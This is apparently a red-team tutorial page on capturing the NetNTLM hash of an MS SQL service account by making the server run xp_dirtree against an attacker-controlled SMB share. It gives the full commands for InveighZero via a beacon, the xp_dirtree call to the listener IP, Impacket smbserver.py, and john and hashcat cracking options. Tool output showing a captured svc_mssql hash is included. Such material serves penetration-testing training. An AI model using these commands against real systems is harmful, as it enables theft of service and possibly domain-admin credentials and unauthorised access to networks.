The **xp_dirtree** procedure can be used to capture the NetNTLM hash of the principal being used to run the MS SQL Service. We can use [InveighZero](https://github.com/Kevin-Robertson/InveighZero) to listen to the incoming requests (this should be run as a local admin).

```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N

[*] Inveigh 0.913 started at 2021-03-10T18:02:36
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.10.17.231
[+] Spoofer IP Address = 10.10.17.231
[+] Packet Sniffer = Enabled
[+] DHCPv6 Spoofer = Disabled
[+] DNS Spoofer = Disabled
[+] LLMNR Spoofer = Disabled
[+] LLMNRv6 Spoofer = Disabled
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] HTTP Capture = Disabled
[+] Proxy Capture = Disabled
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] SMB Capture = Enabled
[+] Machine Account Capture = Disabled
[+] File Output = Disabled
[+] Log Output = Enabled
[+] Pcap Output = Disabled
[+] Previous Session Files = Not Found
[*] Press ESC to access console
```

  

Now execute `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` on the MS SQL server, where `10.10.17.231` is the IP address of the machine running InveighZero.

```
[+] [2021-05-14T15:33:49] TCP(445) SYN packet from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLMv2 captured for DEV\svc_mssql from 10.10.17.25(SRV-1):50323:
svc_mssql::DEV:[...snip...]
```

Use `--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2` with **john** or `-a 0 -m 5600 svc_mssql-netntlmv2 wordlist` with **hashcat** to crack.

This is useful because the SQL Instance may be being run by a privileged account, sometimes even a Domain Admin. InveighZero will ignore traffic coming from accounts that are generally deemed to be "uncrackable" such as computer accounts.

You may also use the WinDivert + rportfwd combo (shown on the **NTLM Relaying page**) with Impacket's [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to capture the NetNTLM hashes.

```
root@kali:~# python3 /usr/local/bin/smbserver.py -smb2support pwn .
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,46894)
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] AUTHENTICATE_MESSAGE (DEV\svc_mssql,SRV-1)
[*] User SRV-1\svc_mssql authenticated successfully
[*] svc_mssql::DEV:[...snip...]
[*] Connecting Share(1:pwn)
```